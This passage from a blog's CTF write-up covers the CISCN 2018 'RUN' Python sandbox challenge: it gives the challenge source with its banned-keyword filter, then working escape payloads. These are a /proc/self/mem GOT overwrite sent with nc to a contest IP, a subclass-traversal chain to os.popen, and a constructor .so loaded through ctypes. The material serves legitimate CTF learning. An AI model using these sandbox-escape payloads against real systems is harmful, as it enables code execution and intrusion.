class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-04-09 23:30:58</span></span><br><span class="line"><span class="comment"># @Author  : Xu (you@example.org)</span></span><br><span class="line"><span class="comment"># @Link    : https://xuccc.github.io/</span></span><br><span class="line"><span class="comment"># @Version : $Id$</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> modules</span><br><span class="line"><span class="keyword">from</span> cpython <span class="keyword">import</span> get_dict</span><br><span class="line"><span class="keyword">from</span> types <span class="keyword">import</span> FunctionType</span><br><span class="line"></span><br><span class="line">main  = modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__</span><br><span class="line">origin_builtins = main[<span class="string">&#x27;__builtins__&#x27;</span>].__dict__</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_type</span>():</span></span><br><span class="line">    type_dict = get_dict(<span class="built_in">type</span>)</span><br><span class="line">    <span class="keyword">del</span> type_dict[<span class="string">&#x27;__bases__&#x27;</span>]</span><br><span class="line">    <span class="keyword">del</span> type_dict[<span class="string">&#x27;__subclasses__&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_func_code</span>():</span></span><br><span class="line">    func_dict = get_dict(FunctionType)</span><br><span class="line">    <span class="keyword">del</span> func_dict[<span class="string">&#x27;func_code&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_import</span>(<span class="params"><span class="built_in">__import__</span>,whiteList</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">importer</span>(<span class="params">name,<span class="built_in">globals</span>=&#123;&#125;,<span class="built_in">locals</span>=&#123;&#125;,fromlist=[],level=-<span class="number">1</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">in</span> whiteList:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">__import__</span>(name,<span class="built_in">globals</span>,<span class="built_in">locals</span>,fromlist,level)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;HAHA,[%s]  has been banned~&quot;</span> % name</span><br><span class="line">    <span class="keyword">return</span> importer</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReadOnly</span>(<span class="params"><span class="built_in">dict</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;docstring for ReadOnlu&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delitem__</span>(<span class="params">self,keys</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;:(&quot;</span>)        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span>(<span class="params">self,key,default=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;:(&quot;</span>)        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">popitem</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;:(&quot;</span>)        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setdefault</span>(<span class="params">self,key,value</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;:(&quot;</span>)        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setitem__</span>(<span class="params">self,key,value</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;:(&quot;</span>)        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span>(<span class="params">self, name, value</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;:(&quot;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">self,<span class="built_in">dict</span>,**kwargs</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;:(&quot;</span>)        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">builtins_clear</span>():</span></span><br><span class="line">    whiteList = <span class="string">&quot;raw_input  SyntaxError   ValueError  NameError  Exception __import__&quot;</span>.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> mod <span class="keyword">in</span> __builtins__.__dict__.keys():</span><br><span class="line">        <span class="keyword">if</span> mod <span class="keyword">not</span> <span class="keyword">in</span> whiteList:</span><br><span class="line">            <span class="keyword">del</span> __builtins__.__dict__[mod]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_filter</span>(<span class="params">string</span>):</span></span><br><span class="line">    ban = <span class="string">&quot;exec eval pickle os subprocess input sys ls cat&quot;</span>.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ban:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> string.lower():</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;&#123;&#125; has been banned!&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete_type();</span></span><br><span class="line"><span class="keyword">del</span> delete_type</span><br><span class="line">delete_func_code();<span class="keyword">del</span> delete_func_code</span><br><span class="line">builtins_clear();<span class="keyword">del</span> builtins_clear</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whiteMod = []</span><br><span class="line">origin_builtins[<span class="string">&#x27;__import__&#x27;</span>] = safe_import(<span class="built_in">__import__</span>,whiteMod)</span><br><span class="line">safe_builtins = ReadOnly(origin_builtins);<span class="keyword">del</span> ReadOnly</span><br><span class="line">main[<span class="string">&#x27;__builtins__&#x27;</span>] = safe_builtins;<span class="keyword">del</span> safe_builtins</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> get_dict,modules,origin_builtins,safe_import,whiteMod,main,FunctionType</span><br><span class="line"><span class="keyword">del</span> __builtins__, __doc__, __file__, __name__, __package__</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  ____                  </span></span><br><span class="line"><span class="string"> |  _ \ _   _ _ __      </span></span><br><span class="line"><span class="string"> | |_) | | | | &#x27;_ \     </span></span><br><span class="line"><span class="string"> |  _ &lt;| |_| | | | |    </span></span><br><span class="line"><span class="string"> |_| \_\\__,_|_| |_|    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Escape from the dark house built with python :)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Try to getshell then find the flag!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    inp = raw_input(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">    cmd = input_filter(inp)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span> cmd </span><br><span class="line">    <span class="keyword">except</span> NameError, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;wow something lose!We can\&#x27;t find it !  D:&quot;</span></span><br><span class="line">    <span class="keyword">except</span> SyntaxError,e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Noob! Synax Wrong! :(&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;unknow error,try again  :&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>pwn writeup</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># look up the addresses</span></span><br><span class="line">objdump -R python.out | grep -E <span class="string">&#x27;fopen|system&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># copy 8 bytes from the system address to the fopen64 address, and get flag</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;(lambda r, w: r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40](&#x27;grep ciscn -r /home/ctf/&#x27;)) (().__class__.__bases__[0].__subclasses__()[40](&#x27;/proc/self/mem&#x27;,&#x27;r&#x27;), ().__class__.__bases__[0].__subclasses__()[40](&#x27;/proc/self/mem&#x27;,&#x27;w&#x27;,0))&quot;</span> | nc 117.78.43.163 31836</span><br></pre></td></tr></table></figure>
+<p>web writeup</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span></span><br><span class="line">d = <span class="string">&quot;sy&quot;</span>+<span class="string">&quot;s&quot;</span></span><br><span class="line">b = <span class="string">&quot;o&quot;</span>+<span class="string">&quot;s&quot;</span></span><br><span class="line">c = <span class="string">&quot;l&quot;</span>+<span class="string">&quot;s&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(s)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[d].modules[b].popen(c).<span class="built_in">read</span>())</span><br></pre></td></tr></table></figure>
+
+<p>Or you can prepare a <code>so</code> lib file</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_init</span><span class="params">(<span class="keyword">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_init</span><span class="params">(<span class="keyword">void</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;ls -la /home/ctf/ &gt; /tmp/ls_home_ctf&quot;</span>);</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+<p>Then load this using module <code>ctypes</code>.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">86</span>](().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">85</span>]).LoadLibrary(<span class="string">&#x27;/tmp/bk.so&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2019/12/30/2019-12-30-Customize-New-Featured-Kali-2019-4/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Customize New Featured Kali 2019.4</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2019/10/07/2019-10-07-Python-Sandbox-Escape/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Python Sandbox Escape</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>&nbsp;-&nbsp;
+            
+            2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">TyeYeah</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Little-Puzzle"><span class="nav-number">1.</span> <span class="nav-text">Little Puzzle</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Puzzle-2"><span class="nav-number">2.</span> <span class="nav-text">Puzzle 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Puzzle-3"><span class="nav-number">3.</span> <span class="nav-text">Puzzle 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ISCC-2016-Pwn300-pycalc"><span class="nav-number">4.</span> <span class="nav-text">ISCC 2016 - Pwn300 pycalc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution"><span class="nav-number">4.1.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN-2018-RUN"><span class="nav-number">5.</span> <span class="nav-text">CISCN 2018 - RUN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-1"><span class="nav-number">5.1.</span> <span class="nav-text">Solution</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
